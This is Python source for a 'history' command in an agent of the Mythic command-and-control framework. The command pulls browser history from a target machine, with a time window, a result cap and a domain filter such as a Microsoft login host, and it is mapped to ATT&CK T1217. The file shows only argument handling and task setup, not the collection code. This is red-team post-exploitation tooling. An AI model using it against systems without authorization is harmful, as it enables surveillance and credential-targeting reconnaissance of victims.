from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class HistoryArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="lookback_hours",
                type=ParameterType.Number,
                description="How many hours back to retrieve (default: 24)",
                default_value=24,
            ),
            CommandParameter(
                name="max_results",
                type=ParameterType.Number,
                description="Maximum number of history entries (default: 1000)",
                default_value=1000,
            ),
            CommandParameter(
                name="domain_filter",
                type=ParameterType.String,
                description="Optional hostname suffix filter (e.g. login.microsoftonline.com)",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line.strip():
            self.load_args_from_json_string(self.command_line)


class HistoryCommand(CommandBase):
    cmd            = "history"
    needs_admin    = False
    help_cmd       = "history"
    description    = "Retrieve browser history. Optionally filter by domain and limit lookback window."
    version        = 1
    author         = "@asaurusrex"
    argument_class = HistoryArguments
    parameters     = []
    attackmapping  = ["T1217"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        hours       = task.args.get_arg("lookback_hours") or 24
        max_results = task.args.get_arg("max_results")    or 1000
        domain      = task.args.get_arg("domain_filter")  or ""
        task.display_params = f"{hours}h lookback, max={max_results}" + (
            f", domain={domain}" if domain else ""
        )
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
